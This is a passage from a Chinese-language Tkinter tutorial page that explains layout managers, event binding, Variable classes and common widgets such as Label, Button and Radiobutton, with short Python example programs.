wraplength：对于能支持字符换行的组件,该选项指定每行显示的最大字符数,超过该数量的字符将会转到下行显示,单位:integer,典型值:20
xscrollcommand：通常用于将组件的水平滚动改变(包括内容滚动或宽度发生改变)与水平滚动条的set方法关联,从而让组件的水平滚动改变传递到水平滚动条,单位:function,典型值:scroll.set
yscrollcommand：通常用于将组件的垂直滚动改变(包括内容滚动或高度发生改变)与垂直滚动条的set方法关联,从而让组件的垂直滚动改变传递到垂直滚动条,单位:function,典型值:scroll.set

【 Tkinter compound选项 】
程序可以为按钮或Label等组件同时指定text和image两个选项,其中text用于指定该组件上的文本;image用于显示该组件上的图片,当同时指定这两个选项时通常image会覆盖text。但在某些时候程序希望该组件能同时显示文木和图片,此时就需要通过compound选项进行控制。

compound选项支持如下属性值：
None：图片覆盖文字。
LEFT 常量(值为'left'字符串)：图片在左,文本在右。
RIGHT 常量(值为'right'字符串)：图片在右,文本在左。
TOP 常量(值为'top'字符串)： 图片在上,文本在下。
BOTTOM 常量(值为'bottom'字符串)：图片在底,文本在上。
CENTER 常量(值为'center'字符串)：文本在图片上方。

</pre>使用多个单选钮来控制Label的compound选项<textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        bm = PhotoImage(file = 'light.gif')  # 创建一个位图
        self.label = ttk.Label(self.master, text='学编程\n神器', image=bm, font=('StSong', 20, 'bold'), foreground='red') # 同时指定Label的text和image
        self.label.bm = bm
        self.label['compound'] = None  # 设置Label默认的compound为None
        self.label.pack()
        f = ttk.Frame(self.master)     # 创建Frame容器,用于装多个Radiobutton
        f.pack(fill=BOTH, expand=YES)
        compounds = ('None', "LEFT", "RIGHT", "TOP", "BOTTOM", "CENTER")
        # 定义一个StringVar变量,用作绑定Radiobutton的变量
        self.var = StringVar()
        self.var.set('None')
        # 使用循环创建多个Radionbutton组件
        for val in compounds:
            rb = Radiobutton(f, text=val, padx=20, variable=self.var, value=val, command=self.change_compound).pack(side=LEFT, anchor=CENTER)
    # 实现change_compound方法,用于动态改变Label的compound选项
    def change_compound(self):
        self.label['compound'] = self.var.get().lower()
root = Tk()
root.title("compound测试")
App(root)
root.mainloop()

</textarea>
</div>

<div id="manager">
<h4>布局管理器</h4><pre>
布局管理器负责管理各组件的大小和位置,此外当用户调整了窗口的大小之后布局管理器还会自动调整窗口中各组件的大小和位置
Tkinter有3种布局管理器类:pack()包装、grid()网格、place()位置

【 Pack：The Pack Geometry Manager 】
pack()使用Pack布局各个组件,当程序向容器中添加组件时这些组件会依次向后排列,排列方向既可是水平的,也可是垂直的

无论看上去多么复杂、古怪的界面,其实大多可分解为水平排列和垂直排列,而Pack布局既可实现水平排列,也可实现垂直排列,然后再通过多个容器进行组合,这样就可以开发出更复杂的界面了。

使用Pack布局首先要做的事情是将程序界面进行分解,分解成水平排列的容器和垂直排列的容器,有时候甚至要容器嵌套容器,然后使用多个Pack布局的容器将它们组合在一起

</pre>创建了一个窗口,然后使用循环创建了三个Label,并对这三个Label使用了pack()方法进行默认的Pack布局<textarea>
from tkinter import *
root = Tk()
root.title('Pack布局')
for i in range(3):
    lab = Label(root, text="第%d个Label" % (i + 1), bg='#eeeeee')
    lab.pack()
root.mainloop()

</textarea><pre>
pack()方法选项可以通过 help(tkinter.Label.pack)命令查看：
anchor  当可用空间大于组件所需求的大小时该选项决定组件被放置在容器的何处,可选值为N(北,代表上)、E(东,代表右)、S(南,代表下)、W(西,代表左)、NW(西北,代表左上)、NE(东北,代表右上)、SW(西南,代表左下)、SE(东南,代表右下)、CENTER(中,默认值)
expand  该bool值指定当父容器增大时才是否拉伸组件。
fill  设置组件是否沿水平或垂直方向填充。该选项支持NONE、X、Y、BOTH四个值,NONE表示不填充,BOTH表示沿着两个方向填充。
ipadx 指定组件在x方向(水平)上的内部留白(padding)。
ipady 指定组件在y方向(水平)上的内部留白(padding)。
padx  指定组件在x方向(水平)上与其他组件的间距。
pady  指定组件在y方向(水平)上与其他组件的间距。
side  设置组件的添加位置,可以设置为TOP、BOTTOM、LEFT或RIGHT

tk.Label(window, text='P', fg='red', bg='lightgreen').pack(side='top')    # 上
tk.Label(window, text='P', fg='red', bg='lightgreen').pack(side='bottom') # 下
tk.Label(window, text='P', fg='red', bg='lightgreen').pack(side='left')   # 左
tk.Label(window, text='P', fg='red', bg='lightgreen').pack(side='right')  # 右

</pre>当程序界面比较复杂时,就需要使用多个容器(Frame)分开布局,然后再将Frame添加到窗口中<textarea>
from tkinter import *
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        fm1 = Frame(self.master)                   # 创建第一个容器
        fm1.pack(side=LEFT, fill=BOTH, expand=YES) # 该容器放在左边排列
        # 向fm1中添加3个按钮,设置按钮从顶部开始排列,且按钮只能在垂直(X)方向填充
        Button(fm1, text='第一个').pack(side=TOP, fill=X, expand=YES)
        Button(fm1, text='第二个').pack(side=TOP, fill=X, expand=YES)
        Button(fm1, text='第三个').pack(side=TOP,  fill=X, expand=YES)

        fm2 = Frame(self.master)                   # 创建第二个容器
        fm2.pack(side=LEFT, padx=10, expand=YES)   # 该容器放在左边排列挨着fm1,fm2本身不在任何方向上填充,因此fm2内的三个按钮都不能填充
        # 向fm2中添加3个按钮,设置按钮从右边开始排列
        Button(fm2, text='第一个').pack(side=RIGHT, fill=Y, expand=YES)
        Button(fm2, text='第二个').pack(side=RIGHT, fill=Y, expand=YES)
        Button(fm2, text='第三个').pack(side=RIGHT, fill=Y, expand=YES)

        fm3 = Frame(self.master)                             # 创建第三个容器
        fm3.pack(side=RIGHT, padx=10, fill=BOTH, expand=YES) # 该容器放在右边排列,就会挨着fm1
        # 向fm3中添加3个按钮,设置按钮从底部开始排列,且按钮只能在垂直(Y)方向填充
        Button(fm3, text='第一个').pack(side=BOTTOM, fill=Y, expand=YES)
        Button(fm3, text='第二个').pack(side=BOTTOM, fill=Y, expand=YES)
        Button(fm3, text='第三个').pack(side=BOTTOM, fill=Y, expand=YES)

root = Tk()
root.title("Pack布局")
display = App(root)
root.mainloop()

</textarea><pre>
【 Grid：The Grid Geometry Manager 】
Grid把组件空间分解成一个网格进行维护,即按照行、列的方式排列组件,组件位置由其所在的行号和列号决定
使用Grid布局的过程就是为各个组件指定行号和列号的过程,不需要为每个网格都指定大小,Grid布局会自动为它们设置合适的大小

调用grid()方法时可传入多个选项,可以通过执行help(tkinter.Label.grid)命令查看:
ipadx、ipady、padx、pady 同pack()
column  指定将组件放入哪列,第一列的索引为0。
columnspan  指定组件横跨多少列。
row 指定组件放入哪行,第一行的索引为0。
rowspan 指定组件横跨多少行。
sticky  类似pack()方法的anchor选项,可选值为N(北,代表上)、E(东,代表右)、S(南,代表下)、W(西,代表左)、NW(西北,代表左上)、NE(东北,代表右上)、SW(西南,代表左下)、SE(东南,代表右下)、CENTER(中,默认值)

</pre>创建一个三行三列的表格<textarea>
for i in range(3):
    for j in range(3):
        tk.Label(window, text=str(i)+str(j)).grid(row=i, column=j, padx=10, pady=10, ipadx=10, ipady=10)

</textarea>使用Grid布局来实现一个计算器界面<textarea>
# 使用了两个布局管理器进行嵌套,先使用Pack布局管理两个组件,分别是Entry(输入组件)和Frame(容器),这两个组件就会按照从上到下的方式排列。
# 接下来程序使用Grid布局管理Frame容器中的16个按钮,分别将16个按钮放入不同的行、不同的列
from tkinter import *
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        e = Entry(relief=SUNKEN, font=('Courier New', 24), width=25) # 创建一个输入组件
        e.pack(side=TOP, pady=10)                                    # 对该输入组件使用Pack布局,放在容器顶部
        p = Frame(self.master)
        p.pack(side=TOP)
        names = ("0" , "1" , "2" , "3", "4" , "5" , "6" , "7" , "8" , "9", "+" , "-" , "*" , "/" , ".", "=")
        for i in range(len(names)):
            b = Button(p, text=names[i], font=('Verdana', 20), width=6) # 创建Button,将Button放入p组件中
            b.grid(row=i // 4, column=i % 4)
root = Tk()
root.title("Grid布局")
App(root)
root.mainloop()

</textarea><pre>
【 Place：The Place Geometry Manager 】
Place布局就是其他GUI编程中的"绝对布局",这种布局方式要求程序显式指定每个组件的绝对位置或相对于其他组件的位置
place()就是给精确的坐标来定位,如给的(50, 100)就是将这个部件放在坐标为(x=50, y=100)的这个位置, 后面的参数anchor='nw'就是锚定点是西北角
tk.Label(window, text='Pl', font=('Arial', 20), ).place(x=50, y=100, anchor='nw')

place() 方法支持的所有选项,可通过执行help(tkinter.Label.place)命令查看
x 指定组件的X坐标,x为0代表位于最左边。
y 指定组件的Y坐标,y为0代表位于最右边。
relx  指定组件的X坐标,以父容器总宽度为单位1,该值在0.0~1.0之间,其中0.0代表位于窗口最左边,1.0代表位于窗口最右边,0.5代表位于窗口中间。
rely  指定组件的Y坐标,以父容器总高度为单位1,该值在0.0~1.0之间,其中0.0代表位于窗口最上边,1.0代表位于窗口最下边,0.5代表位于窗口中间。
width 指定组件的宽度,以pixel为单位。
height  指定组件的高度,以pixel为单位。
relwidth  指定组件的宽度,以父容器总宽度为单位1,该值应该在0.0~1.0之间,其中1.0代表整个窗口宽度,0.5代表窗口的一半宽度。
relheight 指定组件的高度,以父容器总高度为单位1,该值应该在0.0~1.0之间,其中1.0代表整个窗口高度,0.5代表窗口的一半高度。
bordermode  该属性支持"inside"或"outside"属性值,用于指定当设置组件的宽度、高度时是否计算该组件的边框宽度

当使用Place布局管理容器中的组件时需要设置组件的x、y或relx、rely选项,Tkinter容器内的坐标系统的原点(0,0)在左上角,其中X轴向右延伸,Y轴向下延伸
如果通过x、y指定坐标,单位就是pixel(像素);如果通过relx、rely指定坐标,则以整个父容器的宽度、高度为1。,通过x指定的坐标值越大,该组件就越靠右;通过y指定的坐标值越大,该组件就越靠下

</pre>动态计算各 Label 的大小和位置,并通过 place() 方法设置各 Label 的大小和位置<textarea>
from tkinter import *
import random

class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        books = ('疯狂Python讲义', '疯狂Swift讲义', '疯狂Kotlin讲义', '疯狂Java讲义', '疯狂Ruby讲义')
        for i in range(len(books)):
            ct = [random.randrange(256) for x in range(3)]          # 生成3个随机数
            # 根据背景色的灰度值来计算Label组件的前景色,grayness<125则说明背景色较深,前景色使用白色;否则说明背景色较浅,前景色使用黑色
            grayness = int(round(0.299*ct[0] + 0.587*ct[1] + 0.114*ct[2]))
            bg_color = "#%02x%02x%02x" % tuple(ct)                  # 将元组中3个随机数格式化成16进制数转成颜色格式
            lb = Label(root, text=books[i], fg = 'White' if grayness < 120 else 'Black', bg = bg_color)
            lb.place(x = 20, y = 36 + i*36, width=180, height=30)   # 使用place()设置该Label的大小和位置

root = Tk()
root.title("Place布局")
root.geometry("250x250+30+30")   # 设置窗口的大小和位置,width x height + x_offset + y_offset
App(root)
root.mainloop()

</textarea>
</div>

<div id="event">
<h4>Tkinter command和bind事件处理(绑定)</h4><pre>
command绑定事件处理方法
简单的事件处理可通过command选项来绑定为一个函数或方法,当用户单击指定按钮时通过该command选项绑定的函数或方法就会被触发。

</pre>为按钮的command绑定事件处理方法<textarea>
from tkinter import *
import random
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        self.label = Label(self.master, width=30, font=('Courier', 20), bg='white')
        self.label.pack()
        bn = Button(self.master, text='单击我', command=self.change) # 当该按钮被单击时将会触发当前对象的change()方法
        bn.pack()
    # 定义事件处理方法
    def change(self):
        self.label['text'] = '欢迎学习Python'
        ct = [random.randrange(256) for x in range(3)]
        grayness = int(round(0.299*ct[0] + 0.587*ct[1] + 0.114*ct[2]))
        bg_color = "#%02x%02x%02x" % tuple(ct) # 将元组中3个随机数格式化成16进制数,转成颜色格式
        self.label['bg'] = bg_color
        self.label['fg'] = 'black' if grayness > 125 else 'white'
root = Tk()
root.title("简单事件处理")
App(root)
root.mainloop()

</textarea><pre>
bind绑定事件处理方法
command事件绑定方式虽然简单,但它存在较大的局限性：
程序无法为具体事件如鼠标移动、按键事件绑定事件处理方法。
程序无法获取事件相关信息。

为了弥补这种不足,Python提供了更灵活的事件绑定方式,所有Widget组件都提供了一个bind()方法,该方法可以为任意事件绑定事件处理方法。
event参数代表了传给该事件处理方法的事件对象,通过事件来获取事件源的方式即通过event.widget获取,对于鼠标事件鼠标相对当前组件的位置可通过event对象中的x和y属性来获取

Tkinter直接使用字符串来代表事件类型,比如使用< Button-1>代表鼠标左键单击事件,使用< Double-1>代表鼠标左键双击事件
代表Tkinter事件的字符串大致遵循如下格式：< modifier-type-detail>
modifer则代表事件的修饰部分,比如单击、双击等
type是事件字符串的关键部分,用于描述事件的种类,比如鼠标事件、键盘事件等
detail用于指定事件的详情,比如指定鼠标左键、右键、滚轮等。

Tkinter支持的各种鼠标、键盘事件:
< Button-detail>
鼠标按键的单击事件,detail指定哪一个鼠标键被单击。比如单击鼠标左键为< Button-1>,单击鼠标中键为< Button-2>,单击鼠标右键为< Button-3>,单击向上滚动的滚轮为< Button-4>,单击向下滚动的滚轮为< Button-5>

< modifier Motion>
鼠标在组件上的移动事件,modifier指定要求按住哪个鼠标键。比如按住鼠标左键移动为< B1-Motion>,锁住鼠杯中键移动为< B2-Motion>,按住鼠标右键移动为< B3-Motion>

< ButtonRelease-detail>
鼠标按键的释放事件,detail指定哪一个鼠标键被释放。比如鼠标左键被释放为< ButtonRelease-1>,鼠标中键被释放为< ButtonRelease-2>,鼠标右键被释放为< ButtonRelease-3>

< Double-Button-detail>或< Double-detail>
用户双击某个鼠标键的事件,detail指定哪一个鼠标键被双击。比如双击鼠标左键为< Double-1>,双击鼠标中键为< Double-2>,双击鼠标右键为< Double-3>,双击向上滚动的滚轮为< Double-4>,双击向下滚动的滚轮为< Double-5>

< Enter>
鼠标进入组件的事件,< Enter>事件不是按下回车键事件,按下回车键的事件是< Return>

< Leave>
鼠标移出组件事件

< Focusln>
组件及其包含的子组件获得焦点

< FocusOut>
组件及其包含的子组件失去焦点

< Return>
按下回车键的事件。实际上可以为所有按键绑定事件处理方法。特殊键位名称包括Cancel、BackSpace、Tab、Return(回车)、Shift_L(左Shift,如果只写Shift则代表任意Shift)、Control_L(左Ctrl,如果只写Control则代表任意Ctrl)、Alt_L(左Alt,如果只写Alt则代表任意Alt)、Pause、Caps_Lock、Escape、Prior(Page Up)、Next(Page Down)、End、Home、Left、Up、Right、Down、Print、Insert、Delete、F1、F2、F3、F4、F5、F6、F7、F8、F9、F10、F11、F12、Num_Lock和Scroll_Lock

< Key>
键盘上任意键的单击事件,程序可通过event获取用户单击了哪个键

a
键盘上指定键被单击的事件。比如'a'代表a键被单击,'b'代表b键被单击(不要尖括号)……

< Shift-Up>
在Shift键被按下时按Up键。类似的还有< Shift-Left>、< Shift-Down>、< Alt-Up>、< Control-Up>等

< Configure>
组件大小、位置改变的事件。组件改变之后的大小、位置可通过event的width、height、x、y获取

</pre>为按钮的单击、双击事件绑定事件处理方法<textarea>
from tkinter import *
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        self.show = Label(self.master, width=30, bg='white', font=('times', 20))
        self.show.pack()
        bn = Button(self.master, text='单击或双击')
        bn.pack(fill=BOTH, expand=YES)
        bn.bind('< Button-1>', self.one)    # 为左键单击Btutton-1事件绑定处理方法
        bn.bind('< Double-1>', self.double) # 为左键双击Double-1事件绑定处理方法
    def one(self, event):
        self.show['text'] = "左键单击:%s" % event.widget['text']
        print(event) # < ButtonPress event state=Mod2 num=1 x=223 y=21>
    def double(self, event):
        print("左键双击,退出程序:", event.widget['text'])
        print(event) # < ButtonPress event state=Mod2 num=1 x=223 y=21>
        import sys; sys.exit()
root = Tk()
root.title('简单绑定')
App(root)
root.mainloop()

</textarea>为鼠标移动事件绑定事件处理方法<textarea>
from tkinter import *
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        lb = Label(self.master, width=40, height=3)
        lb.config(bg='lightgreen', font=('Times', 20))
        lb.bind('<Motion>', self.motion)           # 为鼠标移动事件绑定事件处理方法
        lb.bind('<B1-Motion>', self.press_motion)  # 为按住左键时的鼠标移动事件绑定事件处理方法
        lb.pack()
        self.show = Label(self.master, width=38, height=1)
        self.show.config(bg='white', font=('Courier New', 20))
        self.show.pack()
    def motion(self, event):
        self.show['text'] = "鼠标移动到: (%s %s)" % (event.x, event.y)
        return
    def press_motion(self, event):
        self.show['text'] = "按住鼠标的位置为: (%s %s)" % (event.x, event.y)
        return
root = Tk()
root.title('鼠标事件')
App(root)
root.mainloop()

</textarea>为计算器的按钮绑定事件处理方法<textarea>
from tkinter import *
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
        self.expr = None
    def initWidgets(self):
        self.show = Label(relief=SUNKEN, font=('Courier New', 24), width=25, bg='white', anchor=E)
        self.show.pack(side=TOP, pady=10)
        p = Frame(self.master)
        p.pack(side=TOP)
        names = ("0" , "1" , "2" , "3", "4" , "5" , "6" , "7" , "8" , "9", "+" , "-" , "*" , "/" , ".", "=")
        for i in range(len(names)):
            b = Button(p, text=names[i], font=('Verdana', 20), width=6)
            b.grid(row=i // 4, column=i % 4)
            b.bind('< Button-1>', self.click)                      # 为鼠标左键的单击事件绑定事件处理方法
            if b['text'] == '=': b.bind('< Double-1>', self.clean) # 为鼠标左键的双击事件绑定事件处理方法
    def click(self, event):
        # 如果用户单击的是数字键或点号
        if(event.widget['text'] in ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '.')):
            self.show['text'] = self.show['text'] + event.widget['text']
        # 如果用户单击了运算符
        elif(event.widget['text'] in ('+', '-', '*', '/')):
            if self.expr is None:  # 如果当前表达式为None,直接用show组件的内容和运算符进行连接
                self.expr = self.show['text'] + event.widget['text']
            else:                  # 如果当前表达式不为None,用表达式、show组件的内容和运算符进行连接
                self.expr = self.expr + self.show['text'] + event.widget['text']
            self.show['text'] = ''
        elif(event.widget['text'] == '=' and self.expr is not None):
            self.expr = self.expr + self.show['text']
            print(self.expr)
            self.show['text'] = str(eval(self.expr))  # 使用eval函数计算表达式的值
            self.expr = None
    # 双击=按钮时,程序清空计算结果、将表达式设为None
    def clean(self, event):
        self.expr = None
        self.show['text'] = ''
root = Tk()
root.title("计算器")
App(root)
root.mainloop()

</textarea>
</div>

<div id="var">
<h4>Tkinter Variable类用法</h4><pre>
Tkinter支持将很多GUI组件与变量进行双向绑定,执行这种双向绑定后编程非常方便：
如果程序改变变量的值,GUI组件的显示内容或值会随之改变。
当GUI组件的内容发生改变时(比如用户输入),变量的值也会随之改变。

为了让Tkinter组件与变量进行双向绑定,只要为这些组件指定variable(通常绑定组件的value)、textvariable(通常绑定组件显示的文本)等属性即可。

但这种双向绑定有一个限制,就是Tkinter不允许将组件和普通变量进行绑定,只能和tkinter包下Variable类的子类进行绑定,该类包含如下几个子类：
StringVar()：用于包装str值的变量。
IntVar()：用于包装整型值的变量。
DoubleVar()：用于包装浮点值的变量。
BooleanVar()：用于包装bool值的变量。

对于Variable变量而言,如果要设置其保存的变量值则使用它的set()方法;如果要得到其保存的变量值则使用它的get()方法

</pre>将Entry组件与StringVar进行双向绑定,这样程序既可通过该StringVar改变Entry输入框显示的内容,也可通过该StringVar获取Entry输入框中的内容<textarea>
from tkinter import *
# 导入ttk
from tkinter import ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        self.st = StringVar()
        # 创建Entry组件,将其textvariable绑定到self.st变量
        ttk.Entry(self.master, textvariable=self.st, width=24, font=('StSong', 20, 'bold'), foreground='red').pack(fill=BOTH, expand=YES)
        # 创建Frame作为容器
        f = Frame(self.master)
        f.pack()
        # 创建两个按钮,将其放入Frame中
        ttk.Button(f, text='改变', command=self.change).pack(side=LEFT)
        ttk.Button(f, text='获取', command=self.get).pack(side=LEFT)
    def change(self):
        books = ('疯狂Python讲义', '疯狂Kotlin讲义', '疯狂Swift讲义')
        import random
        # 改变self.st变量的值,与之绑定的Entry的内容随之改变
        self.st.set(books[random.randint(0, 2)])
    def get(self):
        from tkinter import messagebox
        # 获取self.st变量的值,实际上就是获取与之绑定的Entry中的内容并使用消息框显示self.st变量的值
        messagebox.showinfo(title='输入内容', message=self.st.get() )
root = Tk()
root.title("variable测试")
App(root)
root.mainloop()

</textarea>
</div>

<div id="widget">
<h4>tkinter组件、控件或部件</h4><pre>
tkinter的提供各种控件如按钮、标签和文本框,一个GUI应用程序中使用,目前有15种Tkinter的部件

【 ttk组件 】
直接使用tkinter模块下的GUI组件的,这些组件看上去特别"复古",为了弥补这点不足,Tkinter后来引入了一个ttk组件作为补充,主要就是简单包装、美化,并使用功能更强大的Combobox取代了原来的Listbox,且新增了LabeledScale(带标签的Scale)、Notebook(多文档窗口)、Progressbar(进度条)、Treeview(树)等组件。

ttk作为一个模块被放在tkinter包下,使用ttk组件与使用普通的Tkinter组件并没有多大的区别,只要导入ttk模块即可

</pre><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        '''
        #listbox组件部分
        cb = Listbox(self.master, font=24)
        # 为Listbox设置列表项
        for s in ('Python', 'Swift', 'Kotlin'):
            cb.insert(END, s)
        cb.pack(side=LEFT, fill=X, expand=YES)
        f = Frame(self.master)
        f.pack(side=RIGHT, fill=BOTH, expand=YES)
        lab = Label(self.master, text='我的标签', font=24)
        lab.pack(side=TOP, fill=BOTH, expand=YES)
        bn = Button(self.master, text='我的按钮')
        bn.pack()

        '''
        # ttk使用Combobox取代了Listbox
        cb = ttk.Combobox(self.master, font=24)
        # 为Combobox设置列表项
        cb['values'] = ('Python', 'Swift', 'Kotlin')
        cb.pack(side=LEFT, fill=X, expand=YES)
        f = ttk.Frame(self.master)
        f.pack(side=RIGHT, fill=BOTH, expand=YES)
        lab = ttk.Label(self.master, text='我的标签', font=24)
        lab.pack(side=TOP, fill=BOTH, expand=YES)
        bn = ttk.Button(self.master, text='我的按钮')
        bn.pack()
root = Tk()
root.title("简单事件处理")
App(root)
root.mainloop()

</textarea><pre>
【 Label 】
标签控件;可以显示文本如提示用户、图标或图片

</pre><textarea>
from tkinter import *
root = Tk()
# 创建一个文本Label对象, justify函数其实就是让下图中的两行文字左对齐啦
textLabel = Label(root, text="您所下载的影片含有未成年人限制内容, \n请满18岁后再点击观看！", justify=LEFT, padx=10)
textLabel.pack(side=LEFT)
# 创建一个图像Label对象, 注意这里只支持gif格式的图片
photo = PhotoImage(file="D:/python/images/02.gif")
imgLabel = Label(root, image=photo)
imgLabel.pack(side=RIGHT)
mainloop()

</textarea>将图片和文字分开, 例如将图片作为背景, 文字显示在图片的上面, 只需要设置compound选项即可<textarea>
from tkinter import *
root = Tk()
photo = PhotoImage(file="./light.gif")
theLabel = Label(root, text="学Python\n到FishC", justify=LEFT, image=photo, compound=CENTER, font=("幼圆", 20), fg="white")
theLabel.pack()
mainloop()

</textarea><pre>
【 Button 】
按钮控件;在程序中显示按钮。

普通的按钮很容易被创建,仅仅指定按钮的内容(文本、位图、图象)和一个当按钮被按下时的回调函数即可：
b = tk.Button(window, text="hit me", command=hit_me)

没有回调函数的按钮是没有用的,按下这个按钮时它什么也不做,可能在开发一个应用程序的时候想实现这种按钮,比如为了不干扰beta版的测试者：
b = tk.Button(window, text="Help", command=DISABLED)

</pre><textarea>
from tkinter import *

def callback():
    var.set("吹吧你, 我才不信嘞！")

root = Tk()
frame1 = Frame(root)
frame2 = Frame(root)
# 创建一个文本Label对象
var = StringVar()
var.set("您所下载的影片含有未成年人限制内容, \n请满18岁后再点击观看！")
textLabel = Label(frame1, textvariable=var, justify=LEFT)
textLabel.pack(side=LEFT)
# 创建一个图形Label对象
# 用PhotoImage实例化一个图片对象(支持gif格式文件哦)
photo = PhotoImage(file="./light.gif")
imgLabel = Label(frame1, image=photo)
imgLabel.pack(side=RIGHT)
# 加一个按钮
theButton = Button(frame2, text="已满18周岁", command=callback)
theButton.pack()
frame1.pack(padx=10, pady=10)
frame2.pack(padx=10, pady=10)

mainloop()

</textarea><textarea>
import tkinter as tk  # 使用Tkinter前需要先导入

# 第1步,实例化object,建立窗口window
window = tk.Tk()

# 第2步,给窗口的可视化起名字
window.title('My Window')

# 第3步,设定窗口的大小(长 * 宽)
window.geometry('500x300')

# 第4步,在图形界面上设定标签
var = tk.StringVar()    # 将label标签的内容设置为字符类型,用var来接收hit_me函数的传出内容用以显示在标签上
l = tk.Label(window, textvariable=var, bg='green', fg='white', font=('Arial', 12), width=30, height=2)
l.pack()

# 定义一个函数功能,供点击Button按键时调用,调用命令参数command=函数名
on_hit = False
def hit_me():
    global on_hit
    if on_hit == False:
        on_hit = True
        var.set('you hit me')
    else:
        on_hit = False
        var.set('')

# 第5步,在窗口界面设置放置Button按键
b = tk.Button(window, text='hit me', font=('Arial', 12), width=10, height=1, command=hit_me)
b.pack()

# 第6步,主窗口循环显示
window.mainloop()

</textarea><pre>
【 Radiobutton 】
单选按钮控件,代表一个变量,它可以有多个值中的一个,点击它将为这个变量设置值,并且清除与这同一变量相关的其它radiobutton。
该组件可以绑定一个方法或函数,当单选钮被选择时该方法或函数将会被触发
为了将多个Radiobutton编为一组,程序需要将多个Radiobutton绑定到同一个变量,当这组Radiobutton的其中一个单选钮被选中时,该变量会随之改变;反过来,当该变量发生改变时,这组Radiobutton也会自动选中该变量值所对应的单选钮

改成按钮的形式：
b = Radiobutton(root, text=lang, variable=v, value=num, indicatoron=False).pack(fill=X)

</pre><textarea>
from tkinter import *

root = Tk()
v = IntVar()
Radiobutton(root, text="One", variable=v, value=1).pack(anchor=W)
Radiobutton(root, text="Two", variable=v, value=2).pack(anchor=W)
Radiobutton(root, text="Three", variable=v, value=3).pack(anchor=W)

mainloop()

</textarea><textarea>
from tkinter import *

root = Tk()
LANGS = [("Python", 1), ("Per1", 2), ("Ruby", 3), ("Lua", 4)]
v = IntVar()
v.set(1)
for lang, num in LANGS:
    b = Radiobutton(root, text=lang, value=num, variable=v)
    b.pack(anchor=W)

mainloop()

</textarea><textarea>
import tkinter as tk        # 使用Tkinter前需要先导入

window = tk.Tk()            # 实例化object,建立窗口window
window.title('My Window')   # 给窗口的可视化起名字
window.geometry('500x300')  # 设定窗口的大小(长 * 宽),这里的乘是小x

# 在图形界面上创建一个标签label用以显示并放置
var = tk.StringVar()    # 定义一个var用来将radiobutton的值和Label的值联系在一起
l = tk.Label(window, bg='yellow', width=20, text='empty')
l.pack()

# 定义选项触发函数功能
def print_selection():
    l.config(text='you have selected ' + var.get())

# 创建三个radiobutton选项,其中variable=var, value='A'表示当鼠标选中了其中一个选项,把value的值A放到变量var中,然后赋值给variable
r1 = tk.Radiobutton(window, text='Option A', variable=var, value='A', command=print_selection)
r1.pack()
r2 = tk.Radiobutton(window, text='Option B', variable=var, value='B', command=print_selection)
r2.pack()
r3 = tk.Radiobutton(window, text='Option C', variable=var, value='C', command=print_selection)
r3.pack()

window.mainloop()  # 主窗口循环显示

</textarea><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        ttk.Label(self.master, text='选择您喜欢的教程:').pack(fill=BOTH, expand=YES)
        self.intVar = IntVar()
        books = ('C语言入门', 'Python入门', 'C++入门',  'Java入门')
        i = 1
        for book in books:
            ttk.Radiobutton(self.master,
                text = book,
                variable = self.intVar, # 将Radiobutton绑定到self.intVar变量
                command = self.change,  # 将选中事件绑定到self.change方法
                value=i).pack(anchor=W)
            i += 1

        self.intVar.set(2)              # 设置Radiobutton绑定的变量的值为2,则选中value为2的Radiobutton
    def change(self):
        from tkinter import messagebox
        messagebox.showinfo(title=None, message=self.intVar.get() ) # 通过Radiobutton绑定变量获取选中的单选框
root = Tk()
root.title("Radiobutton测试")
App(root)
root.mainloop()

</textarea>单选按钮除了可以显示文本,也可以显示图片,只要为其指定image选项即可,图片和文字要同时显示则通过compound控制即可<textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        ttk.Label(self.master, text='选择您喜欢的兵种:').pack(fill=BOTH, expand=YES)
        self.intVar = IntVar()
        races = ('z.png', 'p.png','t.png')
        raceNames = ('虫族', '神族','人族')
        i = 1
        # 采用循环创建多个Radiobutton
        for rc in races:
            bm = PhotoImage(file = 'images/' + rc)
            r = ttk.Radiobutton(self.master,
                image = bm,
                text = raceNames[i - 1],
                compound = RIGHT,       # 图片在文字右边
                variable = self.intVar, # 将Radiobutton绑定到self.intVar变量
                command = self.change,  # 将选中事件绑定到self.change方法
                value=i)
            r.bm = bm
            r.pack(anchor=W)
            i += 1
        self.intVar.set(2)  # 设置默认选中value为2的单选按钮
    def change(self): pass
root = Tk()
root.title("Radiobutton测试")
root.iconbitmap('images/fklogo.ico') # 改变窗口图标
App(root)
root.mainloop()

</textarea><pre>
【 Checkbutton 】
多选框控件,代表一个变量,它有两个不同的值。点击这个按钮将会在这两个值间切换,选择和取消选择。

Checkbutton与Radiobutton很相似,只是Checkbutton允许选择多项,而每组Radiobutton只能选择一项。其他功能基本相似,同样可以显示文字和图片,同样可以绑定变量,同样可以为选中事件绑定处理函数和处理方法。但由于Checkbutton可以同时选中多项,因此程序需要为每个Checkbutton都绑定一个变量。

Checkbutton就像开关一样,它支持两个值：开关打开的值和开关关闭的值。因此在创建Checkbutton时可同时设置onvalue和offvalue选项为打开和关闭分别指定值。如果不指定onvalue和offvalue则onvalue默认为1,offvalue默认为0。

</pre><textarea>
from tkinter import *

root = Tk()
GIRLS = ["西施", "王昭君", "貂蝉", "杨玉环"]
v = []
for girl in GIRLS:
    v.append(IntVar())
